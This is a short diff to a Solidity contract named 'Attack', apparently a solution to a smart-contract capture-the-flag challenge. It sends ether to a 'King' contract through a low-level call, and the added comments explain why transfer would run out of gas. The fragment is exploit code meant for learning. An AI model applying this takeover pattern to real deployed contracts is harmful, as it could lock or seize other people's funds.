@@ -29,6 +29,8 @@ contract Attack {
         // send ether to the king contract, triggering the receive function
         // which will call the fallback function of this contract
         payable(address(king)).call{value: king.prize()}("");
+        // if you use transfer instead of call, the contract will revert OutOfGas
+        // because King contract does something that requires more gas than the default 2300
     }
 }
 
